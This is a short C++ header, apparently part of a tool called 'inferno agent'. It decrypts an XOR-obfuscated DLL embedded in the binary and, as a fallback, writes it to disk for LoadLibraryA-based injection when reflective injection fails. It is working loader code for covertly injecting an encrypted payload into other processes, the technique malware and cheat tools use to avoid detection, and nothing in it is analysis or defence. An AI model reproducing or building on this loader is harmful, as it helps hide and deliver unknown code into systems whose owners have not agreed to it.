#pragma once
#include <cstddef>
#include <cstdint>
#include <fstream>
#include <vector>

#include "inferno_agent_dll_embedded.h"

namespace inferno { namespace embedded {

inline std::vector<uint8_t> decryptEmbeddedDll() {
    std::vector<uint8_t> result(ENCRYPTED_DLL_SIZE);
    for (size_t i = 0; i < ENCRYPTED_DLL_SIZE; ++i) {
        result[i] = ENCRYPTED_DLL[i] ^ XOR_KEY[i % XOR_KEY_LEN];
    }
    return result;
}

// Last-resort: write the decrypted DLL to disk so LoadLibraryA-based fallback
// injection tiers can find it. Only called when reflective injection fails.
inline bool extractEmbeddedDllTo(const std::string& path) {
    auto bytes = decryptEmbeddedDll();
    if (bytes.empty()) return false;
    std::ofstream file(path, std::ios::binary);
    if (!file) return false;
    file.write(reinterpret_cast<const char*>(bytes.data()),
               static_cast<std::streamsize>(bytes.size()));
    return file.good();
}

}}
